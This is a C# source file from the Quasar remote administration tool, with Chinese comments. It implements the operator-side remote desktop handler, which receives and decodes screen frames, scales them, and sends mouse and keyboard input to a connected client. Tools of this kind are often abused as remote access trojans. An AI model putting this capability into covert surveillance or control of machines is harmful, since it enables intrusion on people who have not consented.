﻿using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video.Codecs;
using Quasar.Server.Networking;
using System;
using System.Drawing;
using System.IO;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程桌面交互的消息。
    /// </summary>
    public class RemoteDesktopHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// 指示客户端当前是否正在流式传输桌面帧。
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// 在lock语句中使用，以同步UI线程和线程池之间对<see cref="_codec"/>的访问。
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// 在lock语句中使用，以同步UI线程和线程池之间对<see cref="LocalResolution"/>的访问。
        /// </summary>
        private readonly object _sizeLock = new object();

        /// <summary>
        /// 本地分辨率，参见<seealso cref="LocalResolution"/>。
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// 宽度x高度的本地分辨率。它指示接收到的帧应调整到的分辨率。
        /// </summary>
        /// <remarks>
        /// 此属性是线程安全的。
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        /// <summary>
        /// 表示将处理显示更改的方法。
        /// </summary>
        /// <param name="sender">引发事件的消息处理器。</param>
        /// <param name="value">所有当前可用的显示器。</param>
        public delegate void DisplaysChangedEventHandler(object sender, int value);

        /// <summary>
        /// 当显示器更改时引发。
        /// </summary>
        /// <remarks>
        /// 注册到此事件的处理程序将在构造实例时选择的 
        /// <see cref="System.Threading.SynchronizationContext"/> 上调用。
        /// </remarks>
        public event DisplaysChangedEventHandler DisplaysChanged;

        /// <summary>
        /// 报告更改的显示器。
        /// </summary>
        /// <param name="value">所有当前可用的显示器。</param>
        private void OnDisplaysChanged(int value)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = DisplaysChanged;
                handler?.Invoke(this, (int)val);
            }, value);
        }

        /// <summary>
        /// 与此远程桌面处理器关联的客户端。
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// 用于解码接收帧的视频流编解码器。
        /// </summary>
        private UnsafeStreamCodec _codec;

        /// <summary>
        /// 使用给定客户端初始化 <see cref="RemoteDesktopHandler"/> 类的新实例。
        /// </summary>
        /// <param name="client">关联的客户端。</param>
        public RemoteDesktopHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetDesktopResponse || message is GetMonitorsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktopResponse d:
                    Execute(sender, d);
                    break;
                case GetMonitorsResponse m:
                    Execute(sender, m);
                    break;
            }
        }

        /// <summary>
        /// 使用指定的质量和显示器开始从客户端接收帧。
        /// </summary>
        /// <param name="quality">远程桌面帧的质量。</param>
        /// <param name="display">接收帧的显示器。</param>
        public void BeginReceiveFrames(int quality, int display)
        {
            lock (_syncLock)
            {
                IsStarted = true;
                _codec?.Dispose();
                _codec = null;
                _client.Send(new GetDesktop { CreateNew = true, Quality = quality, DisplayIndex = display });
            }
        }

        /// <summary>
        /// 结束从客户端接收帧。
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
            }
        }

        /// <summary>
        /// 刷新客户端的可用显示器。
        /// </summary>
        public void RefreshDisplays()
        {
            _client.Send(new GetMonitors());
        }

        /// <summary>
        /// 向客户端的指定显示器发送鼠标事件。
        /// </summary>
        /// <param name="mouseAction">要发送的鼠标操作。</param>
        /// <param name="isMouseDown">指示是mousedown还是mouseup事件。</param>
        /// <param name="x"><see cref="LocalResolution"/>内的X坐标。</param>
        /// <param name="y"><see cref="LocalResolution"/>内的Y坐标。</param>
        /// <param name="displayIndex">执行鼠标事件的显示器。</param>
        public void SendMouseEvent(MouseAction mouseAction, bool isMouseDown, int x, int y, int displayIndex)
        {
            lock (_syncLock)
            {
                _client.Send(new DoMouseEvent
                {
                    Action = mouseAction,
                    IsMouseDown = isMouseDown,
                    // calculate remote width & height
                    X = x * _codec.Resolution.Width / LocalResolution.Width,
                    Y = y * _codec.Resolution.Height / LocalResolution.Height,
                    MonitorIndex = displayIndex
                });
            }
        }

        /// <summary>
        /// 向客户端发送键盘事件。
        /// </summary>
        /// <param name="keyCode">按下的键。</param>
        /// <param name="keyDown">指示是keydown还是keyup事件。</param>
        public void SendKeyboardEvent(byte keyCode, bool keyDown)
        {
            _client.Send(new DoKeyboardEvent {Key = keyCode, KeyDown = keyDown});
        }

        private void Execute(ISender client, GetDesktopResponse message)
        {
            lock (_syncLock)
            {
                if (!IsStarted)
                    return;

                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                }

                using (MemoryStream ms = new MemoryStream(message.Image))
                {
                    // create deep copy & resize bitmap to local resolution
                    OnReport(new Bitmap(_codec.DecodeData(ms), LocalResolution));
                }
                
                message.Image = null;

                client.Send(new GetDesktop {Quality = message.Quality, DisplayIndex = message.Monitor});
            }
        }

        private void Execute(ISender client, GetMonitorsResponse message)
        {
            OnDisplaysChanged(message.Number);
        }

        /// <summary>
        /// 释放与此消息处理器关联的所有托管和非托管资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    IsStarted = false;
                }
            }
        }
    }
}
